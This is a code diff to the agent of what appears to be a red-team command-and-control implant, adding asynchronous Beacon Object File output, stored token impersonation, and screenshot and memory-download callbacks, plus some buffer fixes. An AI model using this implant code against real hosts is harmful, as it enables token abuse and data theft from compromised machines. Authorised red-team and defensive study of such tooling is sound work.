@@ -4,19 +4,50 @@
 #include "Packer.h"
 #include "Agent.h"
 #include "main.h"
+#include "Boffer.h"
 
 Packer* bofOutputPacker = NULL;
 int     bofOutputCount  = 0;
 ULONG   bofTaskId       = 0;
+HANDLE  g_StoredToken   = NULL;
+
+BOOL IsAsyncBofThread();
+void AsyncBofOutput(int type, PBYTE data, int dataSize);
 
 void BofOutputToTask(int type, PBYTE data, int dataSize)
 {
+	if (IsAsyncBofThread()) {
+		AsyncBofOutput(type, data, dataSize);
+		return;
+	}
+	
 	if (bofOutputPacker) {
 		bofOutputPacker->Pack32(bofTaskId);
-		bofOutputPacker->Pack32(51);			// COMMAND_EXEC_BOF_OUT
+		bofOutputPacker->Pack32(51); // COMMAND_EXEC_BOF_OUT
 		bofOutputPacker->Pack32(type);
 		bofOutputPacker->PackBytes(data, dataSize);
 	}
+}
+
+void AsyncBofOutput(int type, PBYTE data, int dataSize)
+{
+	AsyncBofContext* ctx = tls_CurrentBofContext;
+	if (!ctx || !ctx->outputBuffer)
+		return;
+
+	ApiWin->EnterCriticalSection(&ctx->outputLock);
+
+	ctx->outputBuffer->Pack32(ctx->taskId);
+	ctx->outputBuffer->Pack32(51);  // COMMAND_EXEC_BOF_OUT
+	ctx->outputBuffer->Pack32(type);
+	ctx->outputBuffer->PackBytes(data, dataSize);
+
+	ApiWin->LeaveCriticalSection(&ctx->outputLock);
+}
+
+BOOL IsAsyncBofThread()
+{
+	return (tls_CurrentBofContext != NULL);
 }
 
 unsigned int swap_endianess(unsigned int indata)
@@ -41,20 +72,19 @@ void BeaconDataParse(datap* parser, char* buffer, int size)
 {
 	if (parser == NULL || buffer == NULL)
 		return;
-
+	
 	parser->original = buffer;
 	parser->buffer = buffer;
 	parser->length = size - 4;
 	parser->size = size - 4;
 	parser->buffer += 4;
-	return;
 }
 
 int BeaconDataInt(datap* parser)
 {
 	if (parser == NULL)
 		return 0;
-
+	
 	int fourbyteint = 0;
 	if (parser->length < 4) {
 		return 0;
@@ -168,7 +198,6 @@ void BeaconFormatAlloc(formatp* format, int maxsz)
 	format->buffer = format->original;
 	format->length = 0;
 	format->size = maxsz;
-	return;
 }
 
 void BeaconFormatReset(formatp* format)
@@ -178,8 +207,7 @@ void BeaconFormatReset(formatp* format)
 
 	memset(format->original, 0, format->size);
 	format->buffer = format->original;
-	format->length = format->size;
-	return;
+	format->length = 0;
 }
 
 void BeaconFormatAppend(formatp* format, const char* text, int len)
@@ -190,7 +218,6 @@ void BeaconFormatAppend(formatp* format, const char* text, int len)
 	memcpy(format->buffer, text, len);
 	format->buffer += len;
 	format->length += len;
-	return;
 }
 
 void BeaconFormatPrintf(formatp* format, const char* fmt, ...)
@@ -204,8 +231,8 @@ void BeaconFormatPrintf(formatp* format, const char* fmt, ...)
 	va_start(args, fmt);
 	length = ApiWin->vsnprintf(NULL, 0, fmt, args);
 	va_end(args);
-
-	if (length == -1)
+	
+	if (length <= 0)
 		return;
 
 	if (format->length + length > format->size) {
@@ -213,24 +240,18 @@ void BeaconFormatPrintf(formatp* format, const char* fmt, ...)
 	}
 
 	va_start(args, fmt);
-	ApiWin->vsnprintf(format->buffer, length, fmt, args);
+	ApiWin->vsnprintf(format->buffer, length + 1, fmt, args);
 	va_end(args);
 	format->length += length;
 	format->buffer += length;
-	return;
 }
 
 char* BeaconFormatToString(formatp* format, int* size)
 {
-	if (format == NULL || size == NULL)
-		return NULL;
-
-	if(size != NULL)
-		*size = format->length;
-
-	format->buffer[0] = '\0';
-	format->buffer += 1;
-	format->length += 1;
+	if (format == NULL) 		
+		return NULL;  	
+	if (size != NULL) 		
+		*size = format->length;  	
 	return format->original;
 }
 
@@ -238,14 +259,13 @@ void BeaconFormatFree(formatp* format)
 {
 	if (format == NULL)
 		return;
-
+	
 	if (format->original) {
 		MemFreeLocal((LPVOID*) &format->original, format->size);
 	}
 	format->buffer = NULL;
 	format->length = 0;
 	format->size = 0;
-	return;
 }
 
 void BeaconFormatInt(formatp* format, int value)
@@ -262,7 +282,6 @@ void BeaconFormatInt(formatp* format, int value)
 	memcpy(format->buffer, &outdata, 4);
 	format->length += 4;
 	format->buffer += 4;
-	return;
 }
 
 
@@ -272,6 +291,11 @@ void BeaconFormatInt(formatp* format, int value)
 BOOL BeaconUseToken(HANDLE token)
 {
 	if (ApiWin->ImpersonateLoggedOnUser(token) || ApiWin->SetThreadToken(NULL, token)) {
+		if (g_StoredToken) {
+			ApiNt->NtClose(g_StoredToken);
+			g_StoredToken = NULL;
+		}
+		ApiWin->DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &g_StoredToken);
 		return TRUE;
 	}
 	return FALSE;
@@ -280,6 +304,10 @@ BOOL BeaconUseToken(HANDLE token)
 void BeaconRevertToken(void)
 {
 	ApiWin->RevertToSelf();
+	if (g_StoredToken) {
+		ApiNt->NtClose(g_StoredToken);
+		g_StoredToken = NULL;
+	}
 }
 
 BOOL BeaconIsAdmin(void)
@@ -321,19 +349,19 @@ PDATA_STORE_OBJECT BeaconDataStoreGetItem(SIZE_T index)
 	return NULL;
 }
 
-VOID BeaconDataStoreProtectItem(SIZE_T index)
+VOID BeaconDataStoreProtectItem(SIZE_T index) 
 {
 
 }
 
-VOID BeaconDataStoreUnprotectItem(SIZE_T index)
+VOID BeaconDataStoreUnprotectItem(SIZE_T index) 
 {
 
 }
 
 ULONG BeaconDataStoreMaxEntries()
 {
-	return NULL;
+	return 0;
 }
 
 BOOL toWideChar(char* src, wchar_t* dst, int max)
@@ -385,13 +413,13 @@ PVOID BeaconGetValue(const char* key)
 
 BOOL BeaconRemoveValue(const char* key)
 {
-	if (!key || strlen(key) == 0)
+	if (!key || StrLenA(key) == 0)
 		return FALSE;
 
 	for (auto it = g_Agent->Values.begin(); it != g_Agent->Values.end(); ++it) {
 		if (StrCmpA((const char*)(*it).key, key) == 0) {
 			LPVOID lpKey = (*it).key;
-			DWORD dwBufferSize = StrLenA((*it).key);
+			DWORD dwBufferSize = StrLenA((*it).key) + 1;
 			MemFreeLocal(&lpKey, dwBufferSize);
 			g_Agent->Values.remove((*it).key);
 			return TRUE;
@@ -429,6 +457,34 @@ BOOL BeaconGetSyscallInformation(PBEACON_SYSCALLS info, BOOL resolveIfNotInitial
 //BOOL BeaconReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesRead);
 //BOOL BeaconWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
 
+/// Async BOF API
+
+BOOL BeaconRegisterThreadCallback(PVOID callbackFunction, PVOID callbackData)
+{
+	return TRUE;
+}
+
+BOOL BeaconUnregisterThreadCallback()
+{
+	return TRUE;
+}
+
+void BeaconWakeup()
+{
+	if (g_AsyncBofManager)
+		g_AsyncBofManager->SignalWakeup();
+}
+
+HANDLE BeaconGetStopJobEvent()
+{
+	AsyncBofContext* ctx = tls_CurrentBofContext;
+	if (!ctx)
+		return NULL;
+	return ctx->hStopEvent;
+}
+
+/// 3rd party API
+
 HMODULE proxy_LoadLibraryA(LPCSTR lpLibFileName)
 {
 	return ApiWin->LoadLibraryA(lpLibFileName);
@@ -453,6 +509,10 @@ BOOL proxy_FreeLibrary(HMODULE hLibModule)
 
 void AxAddScreenshot(char* note, char* data, int len)
 {
+	if (IsAsyncBofThread()) {
+		AsyncBofOutput(CALLBACK_AX_SCREENSHOT, (PBYTE)data, len);
+		return;
+	}
 	if (bofOutputPacker) {
 		bofOutputPacker->Pack32(bofTaskId);
 		bofOutputPacker->Pack32(51);			// COMMAND_EXEC_BOF_OUT
@@ -464,6 +524,10 @@ void AxAddScreenshot(char* note, char* data, int len)
 
 void AxDownloadMemory(char* filename, char* data, int len)
 {
+	if (IsAsyncBofThread()) {
+		AsyncBofOutput(CALLBACK_AX_DOWNLOAD_MEM, (PBYTE)data, len);
+		return;
+	}
 	if (bofOutputPacker) {
 		bofOutputPacker->Pack32(bofTaskId);
 		bofOutputPacker->Pack32(51);			// COMMAND_EXEC_BOF_OUT
